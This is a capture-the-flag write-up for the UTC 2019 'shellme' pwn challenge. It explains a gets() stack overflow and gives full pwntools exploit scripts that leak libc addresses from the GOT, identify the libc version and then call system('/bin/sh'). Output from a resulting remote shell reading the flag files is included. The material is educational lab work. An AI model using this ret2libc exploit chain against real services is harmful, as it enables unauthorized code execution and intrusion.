## Utc 2019 shellme

Let's take a look at the binary:

```
$    file server
server: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=be2f490cdd60374344e1075c9dd31060666bd524, not stripped
$    pwn checksec server
[*] '/Hackery/utc/shelltime/server'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$    ./server

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffde2de0 | 00 00 00 00 00 00 00 00 |
0xffde2de8 | 00 00 00 00 00 00 00 00 |
0xffde2df0 | 00 00 00 00 00 00 00 00 |
0xffde2df8 | 00 00 00 00 00 00 00 00 |
0xffde2e00 | ff ff ff ff ff ff ff ff |
0xffde2e08 | ff ff ff ff ff ff ff ff |
0xffde2e10 | 80 75 ec f7 00 a0 04 08 |
0xffde2e18 | 28 2e de ff 8b 86 04 08 |
Return address: 0x0804868b

Input some text: 0000000000000000000000000000000000000000000000000000000000

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffde2de0 | 30 30 30 30 30 30 30 30 |
0xffde2de8 | 30 30 30 30 30 30 30 30 |
0xffde2df0 | 30 30 30 30 30 30 30 30 |
0xffde2df8 | 30 30 30 30 30 30 30 30 |
0xffde2e00 | 30 30 30 30 30 30 30 30 |
0xffde2e08 | 30 30 30 30 30 30 30 30 |
0xffde2e10 | 30 30 30 30 30 30 30 30 |
0xffde2e18 | 30 30 00 ff 8b 86 04 08 |
Return address: 0x0804868b

Segmentation fault (core dumped)
```

So we can see we are dealing with a `32` bit binary, with `NX` enabled. When we run the binary, we get what looks like a buffer overflow.

### Reversing

When we take a look at the `vuln` function in ghidra (`0x080485b1`) we see this:

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void vuln(void)

{
  char acStack60 [32];
  undefined local_1c [20];
 
  memset(acStack60,0,0x20);
  memset(local_1c,0xff,0x10);
  init_visualize(acStack60);
  visualize(acStack60);
  printf("Input some text: ");
  gets(acStack60);
  visualize(acStack60);
  return;
}
```

So we can see that there is a buffer overflow with `gets`. Since there is no stack canary, we can overwrite the return address and get code execution. Let's see how far away the return address is from the start of our input:

```
gef➤  b *vuln+119
Breakpoint 1 at 0x8048628
gef➤  r
Starting program: /Hackery/utc/shelltime/server

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffffd160 | 00 00 00 00 00 00 00 00 |
0xffffd168 | 00 00 00 00 00 00 00 00 |
0xffffd170 | 00 00 00 00 00 00 00 00 |
0xffffd178 | 00 00 00 00 00 00 00 00 |
0xffffd180 | ff ff ff ff ff ff ff ff |
0xffffd188 | ff ff ff ff ff ff ff ff |
0xffffd190 | 80 45 fb f7 00 a0 04 08 |
0xffffd198 | a8 d1 ff ff 8b 86 04 08 |
Return address: 0x0804868b

Input some text: 15935728

Breakpoint 1, 0x08048628 in vuln ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd160  →  "15935728"
$ebx   : 0x0804a000  →  0x08049f0c  →  0x00000001
$ecx   : 0xf7fb4580  →  0xfbad208b
$edx   : 0xffffd168  →  0x00000000
$esp   : 0xffffd150  →  0xffffd160  →  "15935728"
$ebp   : 0xffffd198  →  0xffffd1a8  →  0x00000000
$esi   : 0xf7fb4000  →  0x001e8d6c
$edi   : 0xf7fb4000  →  0x001e8d6c
$eip   : 0x08048628  →  <vuln+119> add esp, 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd150│+0x0000: 0xffffd160  →  "15935728"     ← $esp
0xffffd154│+0x0004: 0x000000ff
0xffffd158│+0x0008: 0x00000010
0xffffd15c│+0x000c: 0x080485bd  →  <vuln+12> add ebx, 0x1a43
0xffffd160│+0x0010: "15935728"
0xffffd164│+0x0014: "5728"
0xffffd168│+0x0018: 0x00000000
0xffffd16c│+0x001c: 0x00000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804861f <vuln+110>       lea    eax, [ebp-0x38]
    0x8048622 <vuln+113>       push   eax
    0x8048623 <vuln+114>       call   0x8048400 <gets@plt>
 →  0x8048628 <vuln+119>       add    esp, 0x10
    0x804862b <vuln+122>       sub    esp, 0xc
    0x804862e <vuln+125>       lea    eax, [ebp-0x38]
    0x8048631 <vuln+128>       push   eax
    0x8048632 <vuln+129>       call   0x80486e1 <visualize>
    0x8048637 <vuln+134>       add    esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048628 → vuln()
[#1] 0x804868b → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 15935728
[+] Searching '15935728' in memory
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
  0xffffd160 - 0xffffd168  →   "15935728"
gef➤  i f
Stack level 0, frame at 0xffffd1a0:
 eip = 0x8048628 in vuln; saved eip = 0x804868b
 called by frame at 0xffffd1c0
 Arglist at 0xffffd198, args:
 Locals at 0xffffd198, Previous frame's sp is 0xffffd1a0
 Saved registers:
  ebx at 0xffffd194, ebp at 0xffffd198, eip at 0xffffd19c
```

So we can see that the offset to the return address from the start of our input is `0xffffd19c - 0xffffd160 = 0x3c` bytes.

### Exploitation

So we can call an instruction pointer, however the difficulty is what to call. When I solved this challenge durring the ctf, I decided to go with leaking a libc address, and using things from libc. However there was one problem with that. We aren't given the libc version. Luckily I had just finished a new tool which is for identifying remote libc versions. All we need is just two libc infoleaks, and it can identify possible remote libc versions.

First off, since PIE isn't enabled we can call imported functions. We also see that `puts` is enabled:

```
$    objdump -D server | grep puts
08048410 <puts@plt>:
 8048704:    e8 07 fd ff ff           call   8048410 <puts@plt>
 8048716:    e8 f5 fc ff ff           call   8048410 <puts@plt>
 8048846:    e8 c5 fb ff ff           call   8048410 <puts@plt>
 8048881:    e8 8a fb ff ff           call   8048410 <puts@plt>
```

So we can just call `puts` twice, with the address being the `got` address for `puts` and `gets`. The got address holds the libc address for the corresponding function. Now in `x86`, `puts` expects it's argument `0x4` bytes after the instruction on the stack. With that we can get our two libc addresses.

Now for actually identifying the remote libc version, we can just use the tool I mentioned earlier (https://github.com/guyinatuxedo/The_Night). All we need to do is import it into our exploit code, then call a single function. For that single function, there will be four arguments. The first two will be the first libc infoleak along with the symbol for it. The last two will be the second infoleak along with the symbol for it:

```
mport TheNight
from pwn import *


target = remote("chal.utc-ctf.club", 4902)
#target = process("./server")
elf = ELF('server')

#gdb.attach(target, gdbscript = 'b *0x804863f')

payload = ""
payload += "0"*0x3c
payload += p32(elf.symbols["puts"])
payload += p32(elf.symbols["puts"])
payload += p32(elf.got["puts"])
payload += p32(elf.got["gets"])

target.sendline(payload)


for i in range(0, 2):
    print target.recvuntil("Return address:")


for i in range(0, 2):
    print target.recvline()


leak0 = target.recvline()[0:4]
leak1 = target.recvline()[0:4]

puts = u32(leak0)
gets = u32(leak1)

print "puts address: " + hex(puts)
print "gets address: " + hex(gets)

TheNight.findLibcVersion("puts", puts, "gets", gets)

target.interactive()
```

When we run it:

```
$    python idLibc.py
[+] Opening connection to chal.utc-ctf.club on port 4902: Done
[*] '/Hackery/utc/shelltime/server'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xff8834c0 | 00 00 00 00 00 00 00 00 |
0xff8834c8 | 00 00 00 00 00 00 00 00 |
0xff8834d0 | 00 00 00 00 00 00 00 00 |
0xff8834d8 | 00 00 00 00 00 00 00 00 |
0xff8834e0 | ff ff ff ff ff ff ff ff |
0xff8834e8 | ff ff ff ff ff ff ff ff |
0xff8834f0 | c0 a5 f6 f7 00 a0 04 08 |
0xff8834f8 | 08 35 88 ff 8b 86 04 08 |
Return address:
 0x0804868b

Input some text:
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xff8834c0 | 30 30 30 30 30 30 30 30 |
0xff8834c8 | 30 30 30 30 30 30 30 30 |
0xff8834d0 | 30 30 30 30 30 30 30 30 |
0xff8834d8 | 30 30 30 30 30 30 30 30 |
0xff8834e0 | 30 30 30 30 30 30 30 30 |
0xff8834e8 | 30 30 30 30 30 30 30 30 |
0xff8834f0 | 30 30 30 30 30 30 30 30 |
0xff8834f8 | 30 30 30 30 10 84 04 08 |
Return address:
 0x08048410



puts address: 0xf7df9b40
gets address: 0xf7df92b0
Offset:   0x890
Symbol0:  puts
Symbol1:  gets
Address0: 0xf7df9b40
Address1: 0xf7df92b0
Possible libc: output-symbols-libc6-i386_2.19-10ubuntu2_amd64.so
Possible libc: output-symbols-libc6_2.19-10ubuntu2_i386.so
Possible libc: output-symbols-libc6_2.19-10ubuntu2.3_i386.so
Possible libc: output-symbols-libc6-i386_2.19-10ubuntu2.3_amd64.so
Possible libc: output-symbols-libc6_2.27-3ubuntu1_i386.so
[*] Switching to interactive mode
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
$  
```

So these are the possible libc versions:

```
Possible libc: output-symbols-libc6-i386_2.19-10ubuntu2_amd64.so
Possible libc: output-symbols-libc6_2.19-10ubuntu2_i386.so
Possible libc: output-symbols-libc6_2.19-10ubuntu2.3_i386.so
Possible libc: output-symbols-libc6-i386_2.19-10ubuntu2.3_amd64.so
Possible libc: output-symbols-libc6_2.27-3ubuntu1_i386.so
```

So we can see that the two possible versions are `2.27` and `2.19`. I tried `2.27` at first because it is much more modern, and it worked. Now since we know the libc version, and we have a libc infoleak, we can just slightly modify our exploit to get a shell. We will modify the first payload to only give us a single libc infoleak, and then call `vuln` again. The second time around we will just overwrite the return address to point to `system` from libc, with the argument being `/bin/sh` from libc too.

Also to find the offset from the start of the libc to `/bin/sh`, I just used a hex editor for that.

## Exploit

Putting it all together, we have the following exploit:

```
cat exploit.py
import TheNight
from pwn import *


target = remote("chal.utc-ctf.club", 4902)
libc = ELF("libc6_2.27-3ubuntu1_i386.so")

#target = process("./server")
elf = ELF('server')


payload = ""
payload += "0"*0x3c
payload += p32(elf.symbols["puts"])
payload += p32(elf.symbols["vuln"])
payload += p32(elf.got["puts"])

target.sendline(payload)


for i in range(0, 2):
    print target.recvuntil("Return address:")


for i in range(0, 2):
    print target.recvline()


leak0 = target.recvline()[0:4]

puts = u32(leak0)

libcBase = puts - libc.symbols["puts"]

print "libc base: " + hex(libcBase)

binshOffset = 0x17e0cf

payload1 = ""
payload1 += "0"*0x3c
payload1 += p32(libcBase + libc.symbols["system"])
payload1 += p32(0x30303030)
payload1 += p32(libcBase + binshOffset)

target.sendline(payload1)

target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Opening connection to chal.utc-ctf.club on port 4902: Done
[*] '/Hackery/utc/shelltime/libc6_2.27-3ubuntu1_i386.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/Hackery/utc/shelltime/server'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffbba510 | 00 00 00 00 00 00 00 00 |
0xffbba518 | 00 00 00 00 00 00 00 00 |
0xffbba520 | 00 00 00 00 00 00 00 00 |
0xffbba528 | 00 00 00 00 00 00 00 00 |
0xffbba530 | ff ff ff ff ff ff ff ff |
0xffbba538 | ff ff ff ff ff ff ff ff |
0xffbba540 | c0 d5 ef f7 00 a0 04 08 |
0xffbba548 | 58 a5 bb ff 8b 86 04 08 |
Return address:
 0x0804868b

Input some text:
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffbba510 | 30 30 30 30 30 30 30 30 |
0xffbba518 | 30 30 30 30 30 30 30 30 |
0xffbba520 | 30 30 30 30 30 30 30 30 |
0xffbba528 | 30 30 30 30 30 30 30 30 |
0xffbba530 | 30 30 30 30 30 30 30 30 |
0xffbba538 | 30 30 30 30 30 30 30 30 |
0xffbba540 | 30 30 30 30 30 30 30 30 |
0xffbba548 | 30 30 30 30 10 84 04 08 |
Return address:
 0x08048410



libc base: 0xf7d25000
[*] Switching to interactive mode

Legend: buff \x1b[32;1mMODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffbba518 | 00 00 00 00 00 00 00 00 |
0xffbba520 | 00 00 00 00 00 00 00 00 |
0xffbba528 | 00 00 00 00 00 00 00 00 |
0xffbba530 | 00 00 00 00 00 00 00 00 |
0xffbba538 | ff ff ff ff ff ff ff ff |
0xffbba540 | ff ff ff ff ff ff ff ff |
0xffbba548 | 00 00 00 00 30 30 30 30 |
0xffbba550 | 30 30 30 30 18 a0 04 08 |
Return address: 0x0804a018

Input some text:
Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED
  return address MODIFIED
0xffbba518 | 30 30 30 30 30 30 30 30 |
0xffbba520 | 30 30 30 30 30 30 30 30 |
0xffbba528 | 30 30 30 30 30 30 30 30 |
0xffbba530 | 30 30 30 30 30 30 30 30 |
0xffbba538 | 30 30 30 30 30 30 30 30 |
0xffbba540 | 30 30 30 30 30 30 30 30 |
0xffbba548 | 30 30 30 30 30 30 30 30 |
0xffbba550 | 30 30 30 30 00 22 d6 f7 |
Return address: 0xf7d62200

$ w
 23:51:51 up 1 day,  2:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ ls
bin
boot
dev
etc
flag.txt
flag2.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
server
srv
sys
tmp
usr
var
$ cat flag.txt
utc{c0ntr0ling_r1p_1s_n0t_t00_h4rd}
$ cat flag2.txt
utc{c0ngrat1s_0n_th1s_sh3ll!}
```